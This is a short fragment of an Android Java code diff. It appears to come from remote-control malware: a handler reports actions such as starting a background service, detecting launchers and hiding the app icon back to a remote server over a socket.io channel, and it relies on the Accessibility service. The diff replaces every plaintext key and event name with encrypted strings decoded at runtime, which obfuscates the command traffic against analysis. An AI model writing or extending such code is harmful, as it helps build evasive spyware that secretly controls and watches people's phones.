-                    response.put("details", "Serviço de segundo plano iniciado");
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xHI", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xHI", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "enable_background_service");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("vCPkvlD2AjU6xhq2e2FORQ=="), "Serviço de segundo plano iniciado");
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                 }
             } else if ("detect_launchers".equals(action)) {
                 if (service != null) {
                     org.json.JSONArray launchers = service.detectSystemLaunchers();
                     JSONObject response = new JSONObject();
-                    response.put("action", "detect_launchers");
-                    response.put("success", true);
-                    response.put("launchers", launchers);
-                    response.put("detectedCount", launchers.length());
-                    response.put("timestamp", System.currentTimeMillis());
-                    ioSocket.emit("0xHI", response);
-                } else {
-                    JSONObject response = new JSONObject();
-                    response.put("success", false);
-                    response.put("details", "Serviço de Acessibilidade não disponível");
-                    ioSocket.emit("0xHI", response);
+                    response.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "detect_launchers");
+                    response.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true);
+                    response.put(StringCrypto.d("2agtNtD2X/M1VxLUhOUV8A=="), launchers);
+                    response.put(StringCrypto.d("Zzci4YKGitao/CnfafpMWA=="), launchers.length());
+                    response.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis());
+                    ioSocket.emit(StringCrypto.d("i6spsZ6J5riK1ljZZNRUCw=="), response);
                 }
             }
         } catch (Exception error) {
             error.printStackTrace();
-            try {
-                JSONObject response = new JSONObject();
-                response.put("operation", "hide_icon_error");
-                response.put("success", false);
-                response.put("details", error.getMessage());
-                ioSocket.emit("0xHI", response);
-            } catch (Exception ex) {
-                ex.printStackTrace();
-            }
         }
     }
-
-
 }
